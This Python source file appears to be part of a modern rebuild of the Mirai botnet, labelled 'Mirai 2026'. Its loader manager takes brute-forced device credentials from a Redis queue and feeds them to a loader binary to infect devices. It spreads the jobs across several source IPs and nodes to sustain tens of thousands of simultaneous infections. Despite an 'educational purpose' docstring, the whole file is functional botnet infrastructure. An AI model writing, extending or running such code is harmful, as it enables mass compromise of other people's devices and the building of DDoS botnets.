#!/usr/bin/env python3
"""
Mirai 2026 - Loader Manager

Manages distribution of bruted results to multiple loader instances.

Features:
- Multi-IP loading support (bypass port exhaustion)
- Connection pooling
- Health checking for loader nodes
- Load balancing (round-robin, least-loaded)
- Integration with scan_receiver.py queue

Educational Purpose: Demonstrates how Mirai achieved 60k-70k simultaneous
outbound connections by spreading across multiple source IPs.

Original Mirai specs:
- 60k-70k simultaneous loads
- 5 source IPs
- 3x 10Gbps servers
- Distributor spreads load equally
"""

import argparse
import logging
import time
import threading
import json
import subprocess
import queue
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False
    print("Warning: Redis not available")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


class LoaderStatus(Enum):
    """Loader node status"""
    HEALTHY = "healthy"
    DEGRADED = "degraded"
    DOWN = "down"


@dataclass
class LoaderNode:
    """Represents a loader instance"""
    host: str
    port: int
    source_ip: str  # Source IP to bind to
    max_connections: int = 12000  # Per-IP limit (~12k per IP for 5 IPs = 60k)
    
    # Runtime state
    status: LoaderStatus = LoaderStatus.HEALTHY
    active_connections: int = 0
    total_loads: int = 0
    successful_loads: int = 0
    failed_loads: int = 0
    last_health_check: float = 0.0


class LoadBalancer(Enum):
    """Load balancing strategies"""
    ROUND_ROBIN = "round_robin"
    LEAST_LOADED = "least_loaded"
    RANDOM = "random"


class LoaderManager:
    """
    Manages distribution of loading tasks across multiple loader nodes
    """
    
    def __init__(self, redis_url: str, queue_name: str = "loader_queue",
                 loader_binary: str = "./loader/loader",
                 balance_strategy: LoadBalancer = LoadBalancer.LEAST_LOADED):
        self.redis_url = redis_url
        self.queue_name = queue_name
        self.loader_binary = loader_binary
        self.balance_strategy = balance_strategy
        
        self.redis_client = None
        if REDIS_AVAILABLE:
            try:
                self.redis_client = redis.from_url(redis_url)
                self.redis_client.ping()
                logger.info(f"Connected to Redis: {redis_url}")
            except Exception as e:
                logger.error(f"Failed to connect to Redis: {e}")
        
        self.loader_nodes: List[LoaderNode] = []
        self.running = False
        self.round_robin_index = 0
        
        # Statistics
        self.stats = {
            'total_distributed': 0,
            'total_loaded': 0,
            'total_failed': 0,
            'queue_size': 0,
            'start_time': time.time()
        }
    
    def add_loader_node(self, host: str, port: int, source_ip: str,
                       max_connections: int = 12000):
        """Add a loader node to the pool"""
        node = LoaderNode(
            host=host,
            port=port,
            source_ip=source_ip,
            max_connections=max_connections
        )
        self.loader_nodes.append(node)
        logger.info(f"Added loader node: {source_ip} -> {host}:{port} "
                   f"(max_conn={max_connections})")
    
    def _select_loader_node(self) -> Optional[LoaderNode]:
        """Select best loader node based on strategy"""
        if not self.loader_nodes:
            return None
        
        # Filter healthy nodes
        healthy_nodes = [
            node for node in self.loader_nodes
            if node.status == LoaderStatus.HEALTHY
            and node.active_connections < node.max_connections
        ]
        
        if not healthy_nodes:
            logger.warning("No healthy loader nodes available!")
            return None
        
        if self.balance_strategy == LoadBalancer.ROUND_ROBIN:
            # Round-robin
            self.round_robin_index = (self.round_robin_index + 1) % len(healthy_nodes)
            return healthy_nodes[self.round_robin_index]
        
        elif self.balance_strategy == LoadBalancer.LEAST_LOADED:
            # Least loaded (by active connections)
            return min(healthy_nodes, key=lambda n: n.active_connections)
        
        elif self.balance_strategy == LoadBalancer.RANDOM:
            import random
            return random.choice(healthy_nodes)
        
        return healthy_nodes[0]
    
    def _invoke_loader(self, node: LoaderNode, target: Dict) -> bool:
        """
        Invoke the loader binary for a single target
        
        Original loader protocol: ip:port user:pass (via STDIN)
        """
        try:
            # Format: ip:port user:pass
            input_line = f"{target['ip']}:{target['port']} " \
                        f"{target['username']}:{target['password']}\n"
            
            # Run loader with proper source IP binding
            # Note: Loader needs to support --source-ip flag (needs implementation)
            cmd = [
                self.loader_binary,
                '--source-ip', node.source_ip
            ]
            
            process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(input=input_line, timeout=30)
            
            if process.returncode == 0:
                node.successful_loads += 1
                self.stats['total_loaded'] += 1
                logger.debug(f"Successfully loaded {target['ip']}:{target['port']} "
                           f"via {node.source_ip}")
                return True
            else:
                node.failed_loads += 1
                self.stats['total_failed'] += 1
                logger.debug(f"Failed to load {target['ip']}:{target['port']}: "
                           f"{stderr.strip()}")
                return False
        
        except subprocess.TimeoutExpired:
            node.failed_loads += 1
            self.stats['total_failed'] += 1
            logger.warning(f"Loader timeout for {target['ip']}:{target['port']}")
            return False
        
        except Exception as e:
            node.failed_loads += 1
            self.stats['total_failed'] += 1
            logger.error(f"Loader error: {e}")
            return False
    
    def _health_check_thread(self):
        """Background thread for health checking loader nodes"""
        while self.running:
            for node in self.loader_nodes:
                # Simple health check: mark as healthy if not overloaded
                if node.active_connections < node.max_connections:
                    node.status = LoaderStatus.HEALTHY
                elif node.active_connections < node.max_connections * 1.2:
                    node.status = LoaderStatus.DEGRADED
                else:
                    node.status = LoaderStatus.DOWN
                
                node.last_health_check = time.time()
            
            time.sleep(5)  # Check every 5 seconds
    
    def _stats_logger_thread(self):
        """Background thread for logging statistics"""
        while self.running:
            time.sleep(10)  # Log every 10 seconds
            
            # Queue size
            if self.redis_client:
                try:
                    queue_size = self.redis_client.llen(self.queue_name)
                    self.stats['queue_size'] = queue_size
                except:
                    queue_size = 0
            else:
                queue_size = 0
            
            # Per-node stats
            total_active = sum(node.active_connections for node in self.loader_nodes)
            
            logger.info(
                f"Stats: queue={queue_size}, active_loads={total_active}, "
                f"total_distributed={self.stats['total_distributed']}, "
                f"success={self.stats['total_loaded']}, "
                f"failed={self.stats['total_failed']}"
            )
            
            # Per-node details
            for i, node in enumerate(self.loader_nodes):
                logger.info(
                    f"  Node {i} ({node.source_ip}): "
                    f"status={node.status.value}, "
                    f"active={node.active_connections}/{node.max_connections}, "
                    f"success={node.successful_loads}, "
                    f"failed={node.failed_loads}"
                )
    
    def _loader_worker(self):
        """Worker thread that pulls from queue and invokes loader"""
        while self.running:
            try:
                # Get from Redis queue (blocking with timeout)
                if self.redis_client:
                    item = self.redis_client.blpop(self.queue_name, timeout=1)
                    if not item:
                        continue
                    
                    _, payload = item
                    target = json.loads(payload)
                else:
                    logger.error("Redis not available, cannot process queue")
                    time.sleep(5)
                    continue
                
                # Select loader node
                node = self._select_loader_node()
                if not node:
                    # No available nodes, re-queue
                    self.redis_client.rpush(self.queue_name, json.dumps(target))
                    time.sleep(1)
                    continue
                
                # Track active connection
                node.active_connections += 1
                node.total_loads += 1
                self.stats['total_distributed'] += 1
                
                try:
                    # Invoke loader (in thread to avoid blocking)
                    self._invoke_loader(node, target)
                finally:
                    # Decrement active connections
                    node.active_connections -= 1
            
            except Exception as e:
                logger.error(f"Worker error: {e}")
                time.sleep(1)
    
    def start(self, num_workers: int = 10):
        """Start the loader manager"""
        if not self.loader_nodes:
            logger.error("No loader nodes configured!")
            return
        
        if not self.redis_client:
            logger.error("Redis not available, cannot start")
            return
        
        self.running = True
        
        # Start health check thread
        health_thread = threading.Thread(target=self._health_check_thread, daemon=True)
        health_thread.start()
        
        # Start stats logger thread
        stats_thread = threading.Thread(target=self._stats_logger_thread, daemon=True)
        stats_thread.start()
        
        # Start worker threads
        workers = []
        for i in range(num_workers):
            worker = threading.Thread(target=self._loader_worker, daemon=True)
            worker.start()
            workers.append(worker)
        
        logger.info(f"Loader manager started with {num_workers} workers")
        logger.info(f"Total loader nodes: {len(self.loader_nodes)}")
        logger.info(f"Max concurrent loads: "
                   f"{sum(n.max_connections for n in self.loader_nodes)}")
        
        try:
            # Keep main thread alive
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            self.running = False
        
        # Wait for workers to finish
        for worker in workers:
            worker.join(timeout=5)
        
        logger.info("Loader manager stopped")


def main():
    parser = argparse.ArgumentParser(
        description='Mirai 2026 Loader Manager - Distributes loading across multiple IPs'
    )
    parser.add_argument('--redis-url', required=True,
                       help='Redis URL (e.g., redis://localhost:6379/0)')
    parser.add_argument('--queue-name', default='loader_queue',
                       help='Redis queue name (default: loader_queue)')
    parser.add_argument('--loader-binary', default='./loader/loader',
                       help='Path to loader binary')
    parser.add_argument('--workers', type=int, default=10,
                       help='Number of worker threads (default: 10)')
    parser.add_argument('--balance', choices=['round_robin', 'least_loaded', 'random'],
                       default='least_loaded',
                       help='Load balancing strategy')
    
    # Loader nodes configuration (could also be from config file)
    parser.add_argument('--node', action='append', nargs=3,
                       metavar=('SOURCE_IP', 'HOST', 'PORT'),
                       help='Add loader node: SOURCE_IP HOST PORT '
                            '(can be specified multiple times)')
    
    args = parser.parse_args()
    
    # Create manager
    manager = LoaderManager(
        redis_url=args.redis_url,
        queue_name=args.queue_name,
        loader_binary=args.loader_binary,
        balance_strategy=LoadBalancer(args.balance)
    )
    
    # Add loader nodes
    if args.node:
        for source_ip, host, port in args.node:
            manager.add_loader_node(host, int(port), source_ip)
    else:
        logger.error("No loader nodes specified! Use --node SOURCE_IP HOST PORT")
        return 1
    
    # Start
    manager.start(num_workers=args.workers)


if __name__ == '__main__':
    main()
